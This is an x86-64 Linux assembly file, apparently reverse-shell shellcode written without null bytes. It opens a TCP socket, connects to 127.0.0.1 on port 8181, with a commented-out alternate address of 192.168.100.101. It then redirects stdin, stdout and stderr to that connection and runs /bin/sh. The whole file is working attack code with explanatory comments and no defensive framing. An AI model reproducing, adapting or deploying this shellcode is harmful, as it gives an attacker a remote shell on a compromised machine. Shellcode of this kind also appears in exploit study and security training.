	global _start

	section .text
_start:
	;; socket
	xor	rax,rax		; rax=0
	add	rax,41		; rax=41
	xor	rdi,rdi		; rdi=0
	add	rdi,2		; rdi=2(AF_INET)
	xor	rsi,rsi		; rsi=0
	add	rsi,1		; rsi=1(SOCK_STREAM)
	xor	rdx,rdx		; rdx=0(IPPROTO_TCP)
	syscall
	
	;; save server socket
	mov	rdi,rax		; rdi=rax=socket_fd

	;; socket variables
	xor	rax,rax		; rax=NULL
	push	rax		; push rax
	push	0x0100007f	; push 127.0.0.1
	;; push	dword 0x6564a8c0 ; push 192.168.100.101
	push 	word 0xf51f	; push 8181(PORT)
	push	word 0x02	; push 2(AF_INET)
	mov	rsi,rsp		; rsi=[AF_INET,8181,"192.168.100.101\0"]

	;; connect
	xor	rax,rax		; rax=0
	add	rax,42		; rax=42
	xor	rdx,rdx		; rdx=0
	add	rdx,16		; rdx=16
	syscall

	;; dup2(stdin)
	xor	rax,rax		; rax=0
	add	rax,33		; rax=33
	xor	rsi,rsi		; rsi=0
	syscall

	;; dup2(stdout)
	xor	rax,rax		; rax=0
	add	rax,33		; rax=33
	xor	rsi,rsi		; rsi=0
	add	rsi,1		; rsi=1
	syscall

	;; dup2(stderr)
	xor	rax,rax		; rax=0
	add	rax,33		; rax=33
	xor	rsi,rsi		; rsi=0
	add	rsi,2		; rsi=2
	syscall
	
	;; execve
	xor	rdx,rdx          	; rdx=NULL
	push 	rdx			; push NULL
	mov     rax,0x68732f2f6e69622f	; rax='/bin//sh'
	push  	rax			; push '/bin//sh'
	mov     rdi,rsp			; rdi='/bin//sh\0'
	push	rdx			; push NULL
	push	rdi			; push '/bin//sh\0'
	mov	rsi,rsp			; rsi=['/bin//sh', NULL]
	lea	rax,[rdx+59]		; rax=59 execve syscall no.
	syscall
